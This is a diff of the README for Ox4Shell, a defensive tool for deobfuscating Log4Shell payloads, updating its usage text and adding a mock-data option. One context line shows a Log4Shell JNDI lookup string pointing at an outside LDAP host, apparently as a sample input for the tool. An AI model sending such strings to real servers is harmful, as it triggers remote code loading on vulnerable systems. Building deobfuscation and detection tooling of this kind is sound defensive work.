@@ -22,7 +22,8 @@ ${jndi:ldap://1.1.1.1:3890/Calc$cz3z]Y_pWxAoLPWh}
 ## Usage
 To run the tool simply:
 ```
-usage: ox4shell [-h] [-d] (-p PAYLOAD | -f FILE)
+~/Ox4Shell » python ox4shell.py --help
+usage: ox4shell [-h] [-d] [-m MOCK] (-p PAYLOAD | -f FILE)
 
    ____       _  _   _____ _          _ _ 
   / __ \     | || | / ____| |        | | |
@@ -34,9 +35,10 @@ usage: ox4shell [-h] [-d] (-p PAYLOAD | -f FILE)
 Ox4Shell - Deobfuscate Log4Shell payloads with ease.
     Created by Oxeye.io
 
-options:
+optional arguments:
   -h, --help            show this help message and exit
   -d, --debug           Enable debug mode
+  -m MOCK, --mock MOCK  The mock data JSON file
   -p PAYLOAD, --payload PAYLOAD
                         The payload to deobfuscate
   -f FILE, --file FILE  A file containing payloads
